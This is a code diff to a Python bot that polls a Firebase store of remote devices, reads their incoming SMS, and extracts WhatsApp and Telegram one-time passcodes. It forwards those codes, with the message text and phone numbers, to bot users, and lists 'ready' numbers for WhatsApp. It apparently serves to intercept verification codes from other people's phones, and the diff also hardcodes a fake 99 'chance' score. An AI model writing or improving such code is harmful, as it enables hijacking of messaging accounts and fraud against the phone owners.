@@ -46,13 +46,18 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
             otp = fbu.extract_otp(text)
             if otp:
                 detected_service = fbu.extract_service_name(text, sender)
+                text_lower = text.lower()
                 
+                # 🚨 STRICT FILTER: WhatsApp / Telegram
                 if service_filter == "whatsapp":
-                    if "whatsapp" not in text.lower() and "whatsapp" not in sender.lower() and not re.search(r'code:\s*\d{3}-\d{3}', text):
+                    # WhatsApp ka message hona chahiye (code format ya whatsapp word)
+                    if "whatsapp" not in text_lower and not re.search(r'code:\s*\d{3}-\d{3}', text):
                         continue
+                    detected_service = "WhatsApp"
                 elif service_filter == "telegram":
-                    if "telegram" not in text.lower():
+                    if "telegram" not in text_lower:
                         continue
+                    detected_service = "Telegram"
                 
                 for uid in users:
                     await send_otp_to_user(bot, uid, detected_service, otp, text, dev_id, phone_number)
@@ -119,10 +124,9 @@ async def whatsapp_scanner(bot):
                     
                     for dev_id, c in clients.items():
                         if not isinstance(c, dict): continue
-                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000) # 1 hour tak online
+                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000)
                         
                         if is_online:
-                            # Last 20 messages check karo
                             msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                             if not msgs_dict: continue
                             
@@ -132,8 +136,7 @@ async def whatsapp_scanner(bot):
                             latest_id = 0
                             for m in msgs:
                                 txt = (m.get("message") or "").lower()
-                                snd = (m.get("sender") or "").lower()
-                                if "whatsapp" in txt or "whatsapp code:" in txt or re.search(r'code:\s*\d{3}-\d{3}', txt):
+                                if "whatsapp" in txt or re.search(r'code:\s*\d{3}-\d{3}', txt):
                                     has_ws = True
                                     mid = int(m.get("id", 0))
                                     if mid > latest_id: latest_id = mid
@@ -143,15 +146,12 @@ async def whatsapp_scanner(bot):
                                 if best_nums:
                                     num = best_nums[0][0]
                                     health = fbu.calculate_health(msgs)
-                                    ws_chance = fbu.get_ws_chance(msgs) 
                                     
-                                    # Agar chance 90% se zyada hai (fresh hai)
-                                    if ws_chance >= 90:
-                                        ready_lines[dev_id] = {
-                                            "fb_url": fb['url'], "auth": fb.get("auth", ""),
-                                            "number": num, "chance": ws_chance, "health": health,
-                                            "time": int(now), "sort_id": latest_id
-                                        }
+                                    ready_lines[dev_id] = {
+                                        "fb_url": fb['url'], "auth": fb.get("auth", ""),
+                                        "number": num, "chance": 99, "health": health,
+                                        "time": int(now), "sort_id": latest_id
+                                    }
             
             d = db.load_data()
             d["whatsapp_ready_lines"] = ready_lines
